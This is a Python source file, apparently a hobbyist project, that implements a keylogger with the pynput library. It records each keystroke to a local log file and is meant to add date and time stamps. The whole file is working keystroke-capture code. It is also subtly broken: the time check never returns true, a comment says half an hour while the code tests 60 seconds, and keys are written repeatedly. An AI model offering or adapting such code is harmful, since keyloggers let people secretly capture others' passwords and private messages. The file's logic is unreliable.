"""
    Creating a key logging program.
    The goal is to log key strokes with the date and time for each sentence.
"""
from pynput import keyboard
from datetime import datetime as t
import time
#%%---------------------------------------------------------------------------
# Constant for how many characters on the line before inserting a new line
MAX_ON_LINE = 10
NEW_LINE = 80
# List to temporarily store the characters in a list
key_counter = 0
count_line = 0
key_list = []

#%%----------------------------------------------------------------------------
# Listens to the key inputs from the keyboard
def on_press(key):
    global key_counter, key_list, MAX_ON_LINE, count_line
    key_counter += 1
    key_list.append(key)
    count_line += 1
    write_file(key_list, count_line)
    if key_counter >= MAX_ON_LINE:
        key_counter = 0
        key_list = []
#%%----------------------------------------------------------------------------
# Marks down keys once released and if theres an esc it'll escape the program.
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False
    
#%%----------------------------------------------------------------------------
# This function gets the current time.
def get_time():
    # This gets the date and time in dd/mm/yyyy and HH:MM:SS.
    now = t.now()
    current_dt = now.strftime("[%d/%m/%Y %H:%M:%S]: ")
    # This only gets the time HH:MM:SS.
    #time_only = t.now()
    #current_t = now.strftime("[%H:%M:%S]: ")
    return current_dt
#%%---------------------------------------------------------------------------
# This functions if half an hour has passed
def check_time():
    oldtime = time.time()
    # check
    if time.time() - oldtime > 60:
        return True
    
#%%----------------------------------------------------------------------------
def write_file(key_list, count_line):
    global NEW_LINE
    # For Linux Directory
    #with open("/home/bladerunner/Documents/python/keylogger/log.txt",'a') as \\
            #log:
    # For Windows Directory
    with open("E:\OneDrive - UNSW\Coding\python\keylogger\log.txt",'a') as log:
        # This appends to a file.
        # This loop will update the text file every 'x' amount of keys.
        if check_time() == True: 
            log.write(get_time())
        for keys in key_list:
            if count_line == NEW_LINE:
                count_line = 0
                log.write("\n")
            
            log.write(str(keys))

#%%----------------------------------------------------------------------------  
# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
#%%----------------------------------------------------------------------------


